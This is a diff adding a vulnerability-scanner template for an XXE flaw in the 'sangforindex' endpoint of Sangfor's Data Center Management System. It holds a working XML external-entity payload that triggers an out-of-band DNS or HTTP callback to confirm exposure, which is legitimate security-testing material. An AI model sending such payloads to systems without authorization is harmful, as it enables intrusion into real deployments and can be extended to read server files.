@@ -1,0 +1,32 @@
+id: sangfor-data-center-management-system-sangforindex-xxe
+info:
+  name: 深信服 数据中心管理系统 sangforindex 接口 - XXE 漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    vuln-id: CT-838973
+    vendor: sangfor
+    product: data-center-management-system
+  tags: xxe,vuln,sangfor
+variables:
+  reverseURL: http://{{interactsh-url}}
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/src/sangforindex'
+    headers:
+      Content-Type: text/xml
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <!DOCTYPE root [
+      <!ENTITY rootas SYSTEM "{{reverseURL}}">
+      ]>
+      <xxx>
+      &rootas;
+      </xxx>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 404 && contains(interactsh_protocol, "dns") || contains(interactsh_protocol, "http")'
